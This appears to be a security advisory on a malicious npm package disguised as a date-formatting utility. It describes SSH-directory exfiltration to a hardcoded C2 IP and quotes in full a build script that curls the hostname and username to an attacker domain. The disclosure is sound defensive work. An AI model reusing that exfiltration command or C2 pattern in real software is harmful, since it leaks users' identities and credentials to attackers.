summary: Credential theft payload and host-identity exfiltration in fake date utility
details: Package advertises itself as a simple date formatting utility but ships active credential-theft code. postinstall.js enumerates the installer's ~/.ssh directory (filtering for.pub key files) and POSTs the listing along with the OS username and platform to a hardcoded bare-IP C2 at https://124.221.154.135:443/post. In-source comments (Chinese) explicitly describe the behavior as credential exfiltration. Separately, package.json declares `scripts.build` as `curl http://admin12345.eyes.sh/pre?h=$(hostname)&u=$(whoami)`, sending hostname and username in cleartext to an attacker-controlled pingback domain whenever `npm run build` is executed. Note: `scripts.postinstall` is NOT declared, so `npm install` does not auto-execute postinstall.js in this version, and index.js (the main export) only re-exports `formatDate` and does not require the payload. The malicious file is shipped in the tarball, however, and a future version that wires up the lifecycle hook — or any consumer who runs `node postinstall.js` directly — will compromise the installer's SSH identity. The package has no legitimate purpose; the date-formatting export is a cover.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
